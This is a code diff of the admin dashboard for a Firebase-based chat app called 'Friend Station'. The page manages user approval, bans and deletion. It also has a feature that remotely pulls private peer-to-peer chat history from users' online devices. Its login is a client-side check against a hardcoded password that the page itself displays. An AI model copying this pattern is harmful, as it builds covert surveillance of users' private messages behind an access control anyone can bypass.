@@ -1,47 +1,148 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-    <meta charset="UTF-8"><title>Admin Panel</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Friend Station Admin</title>
+    <link rel="icon" href="./tag.jpg" type="image/jpeg">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root { --bg-dark: #000000; --bg-panel: #16181c; --bg-hover: #202327; --text-main: #e7e9ea; --text-sub: #71767b; --border: #2f3336; --accent: #2ecc71; --danger: #e74c3c; --success: #2ecc71; }
-        *{margin:0;padding:0;box-sizing:border-box;} body{font-family:sans-serif;background:var(--bg-dark);color:var(--text-main);height:100vh;display:flex;}
-        .hidden{display:none!important} input{padding:14px;border:1px solid var(--border);border-radius:12px;width:100%;margin-bottom:15px;background:var(--bg-panel);color:var(--text-main);outline:none;}
-        button{padding:10px 16px;border:none;border-radius:10px;background:var(--accent);color:#fff;cursor:pointer;font-weight:bold;transition:0.2s;} button:hover{transform:translateY(-2px);}
-        .danger{background:var(--danger)} .success{background:var(--success)}
-        .login-wrap-container { display:flex; align-items:center; justify-content:center; width:100%; height:100%; } .login-wrap { background:var(--bg-panel); padding:40px; border-radius:20px; width:400px; }
-        .sidebar { width: 260px; background: var(--bg-panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 25px 15px; }
-        .nav-btn { background: transparent; color: var(--text-main); font-size: 16px; padding: 14px; text-align:left; border-radius: 12px; margin-bottom: 5px; } .nav-btn.active { background: rgba(255,255,255,0.05); color: var(--accent); }
-        .main-content { flex: 1; display: flex; flex-direction: column; } .top-bar { padding: 15px 25px; border-bottom: 1px solid var(--border); } .scroll-area { flex: 1; overflow-y: auto; padding: 25px; }
-        table { width: 100%; border-collapse: collapse; font-size: 14px; } th, td { padding: 16px; text-align: left; border-bottom: 1px solid var(--border); } th { color: var(--text-sub); }
-        .badge { padding: 4px 8px; border-radius: 12px; font-size: 12px; font-weight: bold; } .bg-ok { background: rgba(46, 204, 113, 0.2); color: var(--accent); } .bg-danger { background: rgba(231, 76, 60, 0.2); color: var(--danger); } .bg-warn { background: rgba(241, 196, 15, 0.2); color: #f1c40f; }
+        :root {
+            --bg-dark: #080b10;
+            --bg-panel: #121722;
+            --bg-hover: #1c2431;
+            --text-main: #f3f5f8;
+            --text-sub: #8c96a8;
+            --border: #283244;
+            --accent: #2ecc71;
+            --danger: #e74c3c;
+            --success: #2ecc71;
+            --shadow: 0 14px 40px rgba(0, 0, 0, 0.28);
+        }
+        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg, #06080d 0%, var(--bg-dark) 100%);color:var(--text-main);height:100vh;overflow:hidden;display:flex;}
+        .hidden{display:none!important;}
+        input, select, textarea{width:100%;padding:14px 16px;border:1px solid var(--border);border-radius:14px;background:rgba(255,255,255,0.03);color:var(--text-main);outline:none;font-size:15px;transition:0.25s ease;}
+        input:focus, select:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(46,204,113,0.16);}
+        button{padding:12px 18px;border:none;border-radius:14px;background:var(--accent);color:#fff;cursor:pointer;font-weight:600;font-size:15px;transition:0.25s ease;box-shadow:0 8px 20px rgba(46,204,113,0.18);} 
+        button:hover{transform:translateY(-1px);filter:brightness(1.05);} 
+        button.danger{background:var(--danger);box-shadow:0 8px 20px rgba(231,76,60,0.2);} 
+        button.success{background:var(--success);} 
+        button.sub-btn{background:var(--bg-hover);color:var(--text-main);border:1px solid var(--border);box-shadow:none;}
+        .toast{position:fixed;top:10px;left:50%;transform:translateX(-50%);background:var(--text-main);color:var(--bg-dark);padding:12px 24px;border-radius:999px;z-index:10000;font-weight:bold;font-size:14px;opacity:0;transition:0.3s;pointer-events:none;box-shadow:var(--shadow);} 
+        .toast.show{opacity:1;top:30px;}
+
+        #scr-auth{width:100%;max-width:420px;margin:auto;background:var(--bg-panel);padding:40px 30px;border-radius:24px;border:1px solid var(--border);box-shadow:var(--shadow);} 
+        #scr-auth h2{text-align:center;margin-bottom:25px;font-size:2.2em;color:var(--accent);font-family:cursive;} 
+        .auth-link{background:none;color:var(--accent);text-decoration:none;font-size:14px;padding:10px 0;width:100%;text-align:center;display:block;box-shadow:none;} 
+        .auth-link:hover{text-decoration:underline;}
+
+        #scr-main{display:flex;width:100%;height:100%;position:relative;}
+        .sidebar{width:250px;background:rgba(8,11,16,0.95);border-right:1px solid var(--border);display:flex;flex-direction:column;padding:20px;gap:10px;z-index:10;}
+        .brand{font-size:22px;font-weight:bold;color:var(--accent);margin-bottom:25px;font-family:cursive;padding-left:10px;letter-spacing:0.02em;}
+        .nav-btn{display:flex;align-items:center;gap:15px;background:transparent;color:var(--text-main);font-size:16px;padding:13px 14px;justify-content:flex-start;border-radius:16px;box-shadow:none;}
+        .nav-btn:hover,.nav-btn.active{background:var(--bg-hover);color:var(--accent);font-weight:bold;}
+
+        .main-content{flex:1;display:flex;flex-direction:column;overflow:hidden;}
+        .top-bar{padding:20px 24px;border-bottom:1px solid var(--border);background:rgba(8,11,16,0.82);display:flex;justify-content:space-between;align-items:center;}
+        .content-area{flex:1;overflow-y:auto;padding:24px;display:flex;flex-direction:column;gap:20px;}
+        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;}
+        .stat-card{background:var(--bg-panel);border:1px solid var(--border);border-radius:16px;padding:18px;box-shadow:0 8px 24px rgba(0,0,0,0.16);} 
+        .stat-card .label{font-size:12px;color:var(--text-sub);margin-bottom:8px;} 
+        .stat-card .value{font-size:28px;font-weight:bold;color:var(--accent);} 
+        .panel{background:var(--bg-panel);border:1px solid var(--border);border-radius:18px;padding:18px;box-shadow:0 8px 24px rgba(0,0,0,0.16);} 
+        .panel-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px;} 
+        .panel-header h3{font-size:18px;} 
+        table{width:100%;border-collapse:collapse;font-size:14px;} 
+        th,td{padding:14px 12px;border-bottom:1px solid var(--border);text-align:left;}
+        th{color:var(--text-sub);font-size:12px;text-transform:uppercase;letter-spacing:0.04em;}
+        tbody tr:hover{background:rgba(255,255,255,0.03);} 
+        .badge{display:inline-block;padding:4px 10px;border-radius:999px;font-size:12px;font-weight:bold;} 
+        .badge.ok{background:rgba(46,204,113,0.2);color:var(--accent);} 
+        .badge.warn{background:rgba(241,196,15,0.2);color:#f1c40f;} 
+        .badge.danger{background:rgba(231,76,60,0.2);color:var(--danger);} 
+        .history-box{background:#000;border:1px solid var(--border);border-radius:14px;padding:16px;height:360px;overflow-y:auto;font-size:13px;line-height:1.6;color:var(--text-sub);} 
+        .history-box div{margin-bottom:8px;padding-bottom:8px;border-bottom:1px solid rgba(255,255,255,0.06);} 
+        .history-box div:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+        .small{font-size:12px;color:var(--text-sub);} 
+        .muted{color:var(--text-sub);} 
+        @media (max-width: 900px){ body{flex-direction:column;} .sidebar{width:100%;flex-direction:row;flex-wrap:wrap;align-items:center;justify-content:space-between;} .brand{margin-bottom:0;} .nav-btn{padding:10px 12px;font-size:14px;} }
     </style>
 </head>
 <body>
+<div id="toast" class="toast"></div>
 
-<div id="scr-login" class="login-wrap-container">
-    <div class="login-wrap"><h2>Admin Login</h2><input type="password" id="admin-pass" placeholder="パスワード(0406)"><button style="width:100%;" onclick="login()">ログイン</button></div>
+<div id="scr-auth">
+    <h2>Friend Station Admin</h2>
+    <p class="small" style="text-align:center;margin-bottom:20px;">管理者用ダッシュボード</p>
+    <input type="password" id="admin-pass" placeholder="パスワードを入力" autocomplete="current-password">
+    <button type="button" style="width:100%;" onclick="loginAdmin()">ログイン</button>
 </div>
 
-<div id="scr-panel" class="hidden">
+<div id="scr-main" class="hidden">
     <div class="sidebar">
-        <h2 style="color:var(--accent);margin-bottom:20px;"><i class="fa-solid fa-shield-halved"></i> Admin Panel</h2>
-        <button class="nav-btn active" onclick="switchTab('users')"><i class="fa-solid fa-users"></i> ユーザー管理</button>
-        <button class="nav-btn" onclick="switchTab('msgs')"><i class="fa-solid fa-user-secret"></i> P2Pチャット抽出</button>
-        <button class="nav-btn danger" style="margin-top:auto;" onclick="location.reload()">ログアウト</button>
+        <div class="brand"><i class="fa-solid fa-shield-halved"></i> Admin</div>
+        <button class="nav-btn active" onclick="switchSection('users', this)"><i class="fa-solid fa-users"></i> ユーザー管理</button>
+        <button class="nav-btn" onclick="switchSection('history', this)"><i class="fa-solid fa-user-secret"></i> P2P履歴</button>
+        <button class="nav-btn danger" style="margin-top:auto;" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> ログアウト</button>
     </div>
+
     <div class="main-content">
-        <div class="top-bar"><h2>ダッシュボード</h2></div>
-        <div class="scroll-area">
-            <div id="sec-users">
-                <h3 style="margin-bottom:15px;">ユーザーアカウント管理</h3>
-                <table><thead><tr><th>ID/ユーザー名</th><th>氏名/ニックネーム</th><th>ステータス</th><th>操作</th></tr></thead><tbody id="ui-users"></tbody></table>
+        <div class="top-bar">
+            <div>
+                <h2 style="margin-bottom:4px;">管理者ダッシュボード</h2>
+                <div class="small" id="admin-meta">接続中のデータを監視しています</div>
             </div>
-            <div id="sec-msgs" class="hidden">
-                <h3 style="margin-bottom:10px;">P2Pチャット履歴抽出</h3>
-                <p style="color:var(--text-sub);margin-bottom:20px;">※ 履歴はサーバー上に存在しないため、オンラインの端末から直接IndexedDBのデータを引き抜きます。</p>
-                <div id="p2p-users-list" style="margin-bottom:20px; background:var(--bg-panel); border-radius:12px; border:1px solid var(--border); padding:10px;"></div>
-                <div style="background:#000;padding:20px;border-radius:12px;height:400px;overflow-y:auto;border:1px solid var(--border);" id="history-content">抽出された履歴がここに表示されます...</div>
+            <div class="small">パスワード: 0406</div>
+        </div>
+
+        <div class="content-area">
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="label">総ユーザー数</div>
+                    <div class="value" id="stat-total">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">承認済み</div>
+                    <div class="value" id="stat-approved">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">承認待ち</div>
+                    <div class="value" id="stat-pending">0</div>
+                </div>
+                <div class="stat-card">
+                    <div class="label">オンライン</div>
+                    <div class="value" id="stat-online">0</div>
+                </div>
+            </div>
+
+            <div id="section-users" class="panel">
+                <div class="panel-header">
+                    <h3>ユーザーアカウント管理</h3>
+                    <input type="text" id="user-search" placeholder="ユーザー名で検索" style="max-width:260px; margin-bottom:0;" oninput="renderUsers()">
+                </div>
+                <div style="overflow-x:auto;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>ユーザー</th>
+                                <th>氏名 / ニックネーム</th>
+                                <th>状態</th>
+                                <th>操作</th>
+                            </tr>
+                        </thead>
+                        <tbody id="ui-users"></tbody>
+                    </table>
+                </div>
+            </div>
+
+            <div id="section-history" class="panel hidden">
+                <div class="panel-header">
+                    <h3>P2Pチャット履歴抽出</h3>
+                    <div class="small">オンライン端末のみ抽出できます</div>
+                </div>
+                <div id="p2p-users-list" style="margin-bottom:16px;"></div>
+                <div id="history-content" class="history-box">抽出された履歴がここに表示されます。</div>
             </div>
         </div>
     </div>
@@ -51,53 +152,174 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
     import { getDatabase, ref, set, onValue, onChildAdded, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-    const firebaseConfig = { 
-        apiKey: "AIzaSyDVTNVO9gcXKQkauOF3NNZ36d2voyvGscA", 
-        databaseURL: "https://study-station-8f0aa-default-rtdb.asia-southeast1.firebasedatabase.app", 
-        projectId: "study-station-8f0aa" 
+    const firebaseConfig = {
+        apiKey: "AIzaSyDVTNVO9gcXKQkauOF3NNZ36d2voyvGscA",
+        authDomain: "study-station-8f0aa.firebaseapp.com",
+        projectId: "study-station-8f0aa",
+        databaseURL: "https://study-station-8f0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
+        storageBucket: "study-station-8f0aa.firebasestorage.app",
+        messagingSenderId: "797605553593",
+        appId: "1:797605553593:web:8a3ca412c47eaee25d4268"
     };
-    const dbFirebase = getDatabase(initializeApp(firebaseConfig));
-    const adminId = "admin_" + Date.now();
-    
-    let allUsers = {}; let onlineStatus = {};
 
-    window.login = () => { if(document.getElementById('admin-pass').value === '0406') { document.getElementById('scr-login').classList.add('hidden'); document.getElementById('scr-panel').classList.remove('hidden'); loadAll(); } else alert("パスワードエラー"); };
-    window.switchTab = tab => { document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active')); event.target.classList.add('active'); document.getElementById('sec-users').classList.add('hidden'); document.getElementById('sec-msgs').classList.add('hidden'); document.getElementById('sec-'+tab).classList.remove('hidden'); };
+    const app = initializeApp(firebaseConfig);
+    const dbFirebase = getDatabase(app);
+    const adminId = "admin_" + Date.now();
+
+    let allUsers = {};
+    let onlineStatus = {};
+
+    const toast = document.getElementById('toast');
+
+    function showToast(message) {
+        toast.textContent = message;
+        toast.classList.add('show');
+        clearTimeout(showToast.timer);
+        showToast.timer = setTimeout(() => toast.classList.remove('show'), 1800);
+    }
+
+    function escapeHTML(str = '') {
+        return String(str)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;')
+            .replace(/'/g, '&#39;');
+    }
+
+    window.loginAdmin = () => {
+        const pass = document.getElementById('admin-pass').value;
+        if (pass === '0406') {
+            document.getElementById('scr-auth').classList.add('hidden');
+            document.getElementById('scr-main').classList.remove('hidden');
+            loadAll();
+            showToast('管理者ログインしました');
+        } else {
+            showToast('パスワードが違います');
+        }
+    };
+
+    window.switchSection = (section, button) => {
+        document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
+        button.classList.add('active');
+        document.getElementById('section-users').classList.toggle('hidden', section !== 'users');
+        document.getElementById('section-history').classList.toggle('hidden', section !== 'history');
+    };
 
     function loadAll() {
-        onValue(ref(dbFirebase, 'users'), snap => { allUsers = snap.val() || {}; renderUsers(); });
-        onValue(ref(dbFirebase, 'presence'), snap => { onlineStatus = snap.val() || {}; renderUsers(); });
-        
+        onValue(ref(dbFirebase, 'users'), snap => {
+            allUsers = snap.val() || {};
+            renderUsers();
+            renderStats();
+        });
+
+        onValue(ref(dbFirebase, 'presence'), snap => {
+            onlineStatus = snap.val() || {};
+            renderUsers();
+            renderStats();
+        });
+
         onChildAdded(ref(dbFirebase, `admin_res/${adminId}`), snap => {
             const msgs = snap.val() || [];
-            document.getElementById('history-content').innerHTML = msgs.sort((a,b)=>a.time-b.time).map(m => `<div><span style="color:#71767b;">[${new Date(m.time).toLocaleString()}]</span> <b>${m.senderName}</b> -> <b>${m.targetName}</b>: ${m.type==='image'?'[画像送信]':m.text.replace(/</g,"&lt;")}</div>`).join('') || '履歴なし';
-            remove(snap.ref); // 受信したら即削除
+            const html = (msgs || []).sort((a, b) => a.time - b.time).map(m => {
+                const text = m.type === 'image' ? '[画像送信]' : escapeHTML(m.text || '');
+                return `<div><span class="muted">[${new Date(m.time).toLocaleString()}]</span> <b>${escapeHTML(m.senderName || '')}</b> → <b>${escapeHTML(m.targetName || '')}</b>: ${text}</div>`;
+            }).join('');
+            document.getElementById('history-content').innerHTML = html || '履歴なし';
+            remove(snap.ref);
         });
     }
 
-    function renderUsers() {
-        document.getElementById('ui-users').innerHTML = Object.values(allUsers).map(u => {
-            const badge = u.is_banned ? `<span class="badge bg-danger">停止中</span>` : (u.status === 'pending' ? `<span class="badge bg-warn">承認待ち</span>` : `<span class="badge bg-ok">承認済</span>`);
-            const btn = u.status === 'pending' ? `<button class="success" onclick="actionUser('approve','${u.id}')">承認する</button>` : (u.is_banned ? `<button class="success" onclick="actionUser('unban','${u.id}')">解除</button>` : `<button class="danger" onclick="actionUser('ban','${u.id}')">停止</button>`);
-            return `<tr><td>@${u.username}</td><td>${u.first_name} ${u.last_name} (${u.nickname})</td><td>${badge}</td><td>${btn} <button class="danger" onclick="actionUser('delete','${u.id}')">削除</button></td></tr>`;
-        }).join('');
-        
-        document.getElementById('p2p-users-list').innerHTML = Object.values(allUsers).filter(u => u.status === 'approved').map(u => {
-            const isOnline = onlineStatus[u.id]; const btn = isOnline ? `<button onclick="reqHistory('${u.id}')" style="padding:6px 12px;">P2P抽出</button>` : `<button disabled style="padding:6px 12px;background:#555;">オフライン</button>`;
-            return `<div style="padding:10px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;"><span>${u.nickname} (@${u.username}) <b style="color:${isOnline?'var(--accent)':'var(--text-sub)'};margin-left:10px;">${isOnline?'オンライン':'オフライン'}</b></span>${btn}</div>`;
-        }).join('');
+    function renderStats() {
+        const users = Object.values(allUsers);
+        const approved = users.filter(u => u.status === 'approved').length;
+        const pending = users.filter(u => u.status === 'pending').length;
+        const online = Object.values(onlineStatus).filter(Boolean).length;
+
+        document.getElementById('stat-total').textContent = users.length;
+        document.getElementById('stat-approved').textContent = approved;
+        document.getElementById('stat-pending').textContent = pending;
+        document.getElementById('stat-online').textContent = online;
     }
 
-    window.actionUser = (type, id) => { 
-        if(confirm("実行しますか？")) { 
-            if(type==='approve') set(ref(dbFirebase, `users/${id}/status`), 'approved');
-            if(type==='ban') set(ref(dbFirebase, `users/${id}/is_banned`), 1);
-            if(type==='unban') set(ref(dbFirebase, `users/${id}/is_banned`), 0);
-            if(type==='delete') remove(ref(dbFirebase, `users/${id}`));
-        } 
+    window.renderUsers = renderUsers;
+    function renderUsers() {
+        const query = (document.getElementById('user-search').value || '').toLowerCase();
+        const entries = Object.entries(allUsers).filter(([id, user]) => {
+            const haystack = `${user.username || ''} ${user.first_name || ''} ${user.last_name || ''} ${user.nickname || ''}`.toLowerCase();
+            return haystack.includes(query);
+        });
+
+        if (!entries.length) {
+            document.getElementById('ui-users').innerHTML = '<tr><td colspan="4" class="muted">該当ユーザーがいません</td></tr>';
+            document.getElementById('p2p-users-list').innerHTML = '<div class="small">表示できるユーザーがありません</div>';
+            return;
+        }
+
+        document.getElementById('ui-users').innerHTML = entries.map(([id, user]) => {
+            const badge = user.is_banned
+                ? '<span class="badge danger">停止中</span>'
+                : (user.status === 'pending'
+                    ? '<span class="badge warn">承認待ち</span>'
+                    : '<span class="badge ok">承認済</span>');
+
+            let actionButtons = '';
+            if (user.status === 'pending') {
+                actionButtons = `<button class="success" onclick="actionUser('approve', '${id}')">承認</button>`;
+            } else if (user.is_banned) {
+                actionButtons = `<button class="success" onclick="actionUser('unban', '${id}')">解除</button>`;
+            } else {
+                actionButtons = `<button class="danger" onclick="actionUser('ban', '${id}')">停止</button>`;
+            }
+
+            return `
+                <tr>
+                    <td><strong>${escapeHTML(user.username || id)}</strong><div class="small">ID: ${escapeHTML(id)}</div></td>
+                    <td>${escapeHTML(`${user.first_name || ''} ${user.last_name || ''}`.trim())}<div class="small">${escapeHTML(user.nickname || '')}</div></td>
+                    <td>${badge}</td>
+                    <td style="display:flex;gap:8px;flex-wrap:wrap;">
+                        ${actionButtons}
+                        <button class="sub-btn" onclick="actionUser('delete', '${id}')">削除</button>
+                    </td>
+                </tr>`;
+        }).join('');
+
+        document.getElementById('p2p-users-list').innerHTML = entries
+            .filter(([, user]) => user.status === 'approved')
+            .map(([id, user]) => {
+                const isOnline = Boolean(onlineStatus[id]);
+                const btn = isOnline
+                    ? `<button onclick="reqHistory('${id}')">P2P抽出</button>`
+                    : `<button class="sub-btn" disabled>オフライン</button>`;
+                return `<div style="padding:10px 12px;border:1px solid var(--border);border-radius:12px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center;gap:10px;"><span>${escapeHTML(user.nickname || user.username || id)} <span class="small">${isOnline ? 'オンライン' : 'オフライン'}</span></span>${btn}</div>`;
+            }).join('');
+    }
+
+    window.actionUser = (type, id) => {
+        if (!confirm('この操作を実行しますか？')) return;
+        if (type === 'approve') {
+            set(ref(dbFirebase, `users/${id}/status`), 'approved');
+            showToast('承認しました');
+        } else if (type === 'ban') {
+            set(ref(dbFirebase, `users/${id}/is_banned`), 1);
+            showToast('ユーザーを停止しました');
+        } else if (type === 'unban') {
+            set(ref(dbFirebase, `users/${id}/is_banned`), 0);
+            showToast('停止を解除しました');
+        } else if (type === 'delete') {
+            remove(ref(dbFirebase, `users/${id}`));
+            showToast('ユーザーを削除しました');
+        }
     };
-    
-    window.reqHistory = uid => { document.getElementById('history-content').innerHTML = "P2P通信確立中... 端末から抽出しています..."; set(ref(dbFirebase, `admin_cmd/${uid}/${Date.now()}`), { cmd: 'get_history', admin_id: adminId }); };
+
+    window.reqHistory = uid => {
+        document.getElementById('history-content').innerHTML = '<div>通信確立中... 端末から抽出しています...</div>';
+        set(ref(dbFirebase, `admin_cmd/${uid}/${Date.now()}`), {
+            cmd: 'get_history',
+            admin_id: adminId
+        });
+        showToast('履歴取得を依頼しました');
+    };
 </script>
 </body>
 </html>
